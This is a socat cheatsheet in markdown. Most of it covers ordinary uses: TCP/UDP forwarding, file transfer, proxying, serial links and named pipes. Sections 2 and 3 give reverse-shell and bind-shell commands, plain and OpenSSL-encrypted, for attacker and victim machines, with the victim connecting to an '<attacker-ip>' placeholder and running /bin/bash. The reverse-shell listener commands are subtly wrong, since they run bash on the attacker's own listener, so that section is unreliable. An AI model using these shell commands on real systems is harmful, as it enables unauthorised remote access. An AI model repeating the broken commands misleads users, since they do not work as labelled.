---
title: Socat
tags:
  - socat
  - cheatsheet
---
Socat (SOcket CAT) is a versatile networking tool that can create bidirectional data transfers over various types of communication channels. Below are common commands and usage scenarios for Socat.

## 1. Basic Commands

### 1.1 Simple TCP Port Forwarding

```bash
# Forward traffic from a local port to a remote address and port
socat TCP-LISTEN:<local-port>,reuseaddr,fork TCP:<remote-ip>:<remote-port>
```

### 1.2 UDP Port Forwarding

```bash
# Forward traffic from a local UDP port to a remote UDP address and port
socat UDP-LISTEN:<local-port>,reuseaddr,fork UDP:<remote-ip>:<remote-port>
```

### 1.3 Connecting to a TCP Port

```bash
# Connect to a remote TCP service
socat TCP:<remote-ip>:<remote-port> -
```

### 1.4 Connecting to a UDP Port

```bash
# Connect to a remote UDP service
socat UDP:<remote-ip>:<remote-port> -
```

## 2. Reverse Shells

### 2.1 Simple Reverse Shell

```bash
# On the attacker's machine (listener)
socat TCP-LISTEN:<port>,reuseaddr,fork EXEC:/bin/bash

# On the victim's machine (reverse shell)
socat TCP:<attacker-ip>:<port> EXEC:/bin/bash
```

### 2.2 Encrypted Reverse Shell with OpenSSL

```bash
# On the attacker's machine (listener with OpenSSL)
socat OPENSSL-LISTEN:<port>,reuseaddr,fork,cert=cert.pem,cafile=ca.pem EXEC:/bin/bash

# On the victim's machine (reverse shell with OpenSSL)
socat OPENSSL:<attacker-ip>:<port>,verify=0 EXEC:/bin/bash
```

## 3. Bind Shells

### 3.1 Simple Bind Shell

```bash
# On the victim's machine (bind shell)
socat TCP-LISTEN:<port>,reuseaddr,fork EXEC:/bin/bash

# On the attacker's machine (connect to bind shell)
socat TCP:<victim-ip>:<port> -
```

### 3.2 Encrypted Bind Shell with OpenSSL

```bash
# On the victim's machine (bind shell with OpenSSL)
socat OPENSSL-LISTEN:<port>,reuseaddr,fork,cert=cert.pem,cafile=ca.pem EXEC:/bin/bash

# On the attacker's machine (connect to bind shell with OpenSSL)
socat OPENSSL:<victim-ip>:<port>,verify=0 -
```

## 4. File Transfers

### 4.1 Sending a File

```bash
# On the sender's machine
socat TCP-LISTEN:<port>,reuseaddr,fork FILE:<file-to-send>

# On the receiver's machine
socat TCP:<sender-ip>:<port> FILE:<output-file>,create
```

### 4.2 Receiving a File

```bash
# On the receiver's machine
socat TCP-LISTEN:<port>,reuseaddr,fork FILE:<output-file>,create

# On the sender's machine
socat TCP:<receiver-ip>:<port> FILE:<file-to-send>
```

## 5. Port Knocking

```bash
# Simple port knocking example
for x in {1111,2222,3333}; do socat TCP:<target-ip>:$x; done
```

## 6. Proxy and Tunneling

### 6.1 TCP Proxy

```bash
# Create a TCP proxy between a local and remote address
socat TCP-LISTEN:<local-port>,reuseaddr,fork TCP:<remote-ip>:<remote-port>
```

### 6.2 HTTP Proxy

```bash
# Create an HTTP proxy (acts as a basic web proxy)
socat TCP-LISTEN:<local-port>,reuseaddr,fork PROXY:<proxy-ip>:<proxy-port>
```

### 6.3 SSH Tunneling

```bash
# Tunnel SSH over a Socat connection
socat TCP-LISTEN:<local-port>,reuseaddr,fork TCP:<ssh-server-ip>:22
```

## 7. Redirecting Traffic

### 7.1 Redirect Traffic to Another Host

```bash
# Redirect incoming traffic to another host
socat TCP-LISTEN:<local-port>,reuseaddr,fork TCP:<target-ip>:<target-port>
```

### 7.2 Redirect Traffic to a File

```bash
# Redirect incoming traffic to a file
socat TCP-LISTEN:<local-port>,reuseaddr,fork FILE:<output-file>
```

## 8. Serial Communication

### 8.1 Simple Serial Port Communication

```bash
# Communication between two serial ports
socat /dev/ttyS0,raw,echo=0 /dev/ttyS1,raw,echo=0
```

### 8.2 Serial to TCP

```bash
# Forward serial port data to a TCP connection
socat /dev/ttyS0,raw,echo=0 TCP:<target-ip>:<port>
```

## 9. Working with Pipes

### 9.1 Create a Named Pipe

```bash
# Create a named pipe for inter-process communication
mkfifo /tmp/pipe
socat -u PIPE:/tmp/pipe TCP-LISTEN:<port>
```

### 9.2 Connect a Process to a Named Pipe

```bash
# Connect a process output to a named pipe
socat EXEC:'<command>' PIPE:/tmp/pipe
```

## 10. References

- [Socat Man Page](http://www.dest-unreach.org/socat/doc/socat.html)
- [High On Coffee - Socat Cheatsheet](https://highon.coffee/blog/socat-cheatsheet/)
